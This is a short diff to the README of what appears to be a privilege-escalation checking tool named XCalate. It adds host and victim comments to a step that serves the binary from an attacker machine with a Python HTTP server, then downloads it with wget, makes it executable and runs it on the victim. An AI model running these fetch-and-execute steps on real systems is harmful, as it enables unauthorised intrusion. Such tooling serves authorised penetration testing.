@@ -11,8 +11,10 @@ Run simple check (not thorough) for possible vector of privilege escalation.
 4. Transfer the binary to the victim machine
 
 ```bash
-sudo python3 -m http.server 80 #host
-wget 10.10.10.10/XCalate
+#host
+sudo python3 -m http.server 80 
+#victim
+wget 10.10.10.10/XCalate 
 chmod +x XCalate
 ./XCalate
 ```
